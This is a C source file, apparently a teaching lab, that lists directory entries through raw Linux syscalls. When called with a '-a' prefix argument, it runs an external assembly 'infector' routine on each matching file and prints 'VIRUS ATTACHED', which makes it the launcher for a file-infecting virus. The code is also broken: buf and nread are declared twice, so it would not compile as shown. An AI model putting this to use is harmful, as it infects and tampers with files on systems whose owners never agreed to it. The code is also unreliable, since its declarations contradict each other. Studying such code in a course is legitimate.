#include "util.h"

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291

#define SYS_CLOSE 6
#define SYS_READ 3
#define SYS_GETDENTS 141  
#define BUFSIZE 10000     /* ≤ 10 KB */
#define O_RDONLY 0        /* open read-only mode*/

#define SYS_CLOSE 6

#define SYS_EXIT 1
#define STDERR 2


extern int system_call();
extern void infection(); /* Assembly usage*/
extern void infector(char *file); /* Assembly usage*/

typedef struct linux_dirent {
  int inode;
  int offset;
  short len;
  char name[];
} ent;

void printVirus() {
    system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHED", strlen("VIRUS ATTACHED"));
}

void printError() {
    system_call(SYS_WRITE, STDERR, " ERROR open virus file", strlen(" Error open virus file"));
}

int main (int argc, char* argv[], char* envp[]) {
    int fd, nread;
    int bytePos = 0;
    char buf[8192];
    ent *entp;
    char *prefix = 0;
    int prefixLen = 0;

    if (argc >= 2 && argv[1][0] == '-' && argv[1][1] == 'a') {
        prefix = argv[1] + 2;
        prefixLen = strlen(prefix);
    }

    fd = system_call(SYS_OPEN, ".", O_RDONLY, 0);
    if (fd < 0) {
        char *error_str = "Error: Exiting with 0x66.\n";
        system_call(SYS_WRITE, STDOUT, error_str, strlen(error_str));
        return 0x66;
    }

    char buf[BUFSIZE]; /* (≤ 10,000 bytes) */
    int nread; /*number of bytes read by GETDENTS SYSCALL*/ 

    nread = system_call(SYS_GETDENTS, fd, buf, 8192);
    if (nread < 0) {
        system_call(SYS_WRITE, STDERR, "Error SYS-GETDENTS", strlen("Error SYS-GETDENTS"));
        system_call(SYS_EXIT, 0x55, 0, 0);
    }

    for (bytePos = 0; bytePos < nread;) {
     entp = (ent *)(buf + bytePos);
     if (strcmp(entp->name, ".") != 0 && strcmp(entp->name, "..") != 0) {
        system_call(SYS_WRITE, STDOUT, entp->name, strlen(entp->name));

        if (prefix && !strncmp(entp->name, prefix, prefixLen)) {
            infector(entp->name);
            printVirus();
        }

        system_call(SYS_WRITE, STDOUT, "\n", 1);
      }
      bytePos += entp->len;
    }

    system_call(SYS_CLOSE, fd, 0, 0);
    return 0;
}
